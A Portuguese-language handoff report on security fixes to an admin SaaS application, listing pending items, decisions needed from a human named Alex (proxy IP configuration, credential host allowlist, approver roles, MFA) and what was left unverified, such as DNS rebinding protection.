- **Registro das mudanças de frontend em `docs/history/frontend-approved-changes.json`**: `OperationCenter.jsx`, `adminHelpers.js` e `SaasDetail.jsx` são arquivos originais do Base44. Atualizar os hashes aprovados é uma decisão humana e a tentativa foi bloqueada como alteração de gate. O gate `original_frontend_integrity` já falhava antes destas correções (`AdminLayout.jsx`, `Integrations.jsx` e `UsersAccess.jsx` sem aprovação) e agora também acusa esses três arquivos.
- A UI de Nova configuração ainda exibe os campos "Autor" e "Status de aprovação", e a de Nova operação o campo de solicitante. O backend ignora esses campos. Removê-los é mudança visual em arquivos Base44, então ficou para aprovação.
- #7 (matriz de papéis), #9, #10, #14, #15, #16 e #20: fora do escopo deste bloco ou dependentes das perguntas de negócio 1–8, que não foram alteradas.
- #19: as operações continuam filtradas pelo **nome** do produto, porque `admin_operations` não guarda `saas_product_id`.
- #18: as dependências mortas (`three`, `jspdf`, `html2canvas`, `react-leaflet`, `@stripe/*`) não foram removidas.
- `tests/integration/test_database.py` espera a revisão `0010` e já estava desatualizado antes (head era `0012`). Não foi executado nem corrigido.

### Decisões necessárias do Alex

1. Configurar `INTEGRATION_CREDENTIAL_HOSTS` no Render com o host real da Admin API do MediaMind, para que o probe volte a funcionar em produção.
2. Configurar `FORWARDED_ALLOW_IPS` (uvicorn) no Render para que `request.client.host` seja o IP real do cliente. Sem isso, todos os logins parecem vir do proxy, o throttling por par degrada para "por conta" (equivalente ao comportamento anterior, mas com backoff) e a conta pode voltar a ser travada por terceiros. Validar o formato de `X-Forwarded-For` do Render antes de definir.
3. Aprovar (ou pedir ajuste de) os arquivos Base44 alterados no registro de mudanças aprovadas.
4. Com quatro olhos obrigatório, uma organização com um único superadmin não consegue mais aprovar operações sensíveis. Definir o papel aprovador (pergunta de negócio 3).
5. MFA para superadmin e política final anti-brute-force (pergunta de negócio 8).

### Não verificado

- Nenhum teste foi feito contra Render, Neon ou serviços reais. A política de saída foi testada com resolvedor DNS simulado e `httpx.MockTransport`.
- Proteção contra DNS rebinding: a validação ocorre imediatamente antes da chamada, mas o IP não é fixado na conexão. Em produção, o vínculo de host configurado pelo operador limita esse risco.
- Revisão `/security-review` completa do bloco não executada nesta sessão.
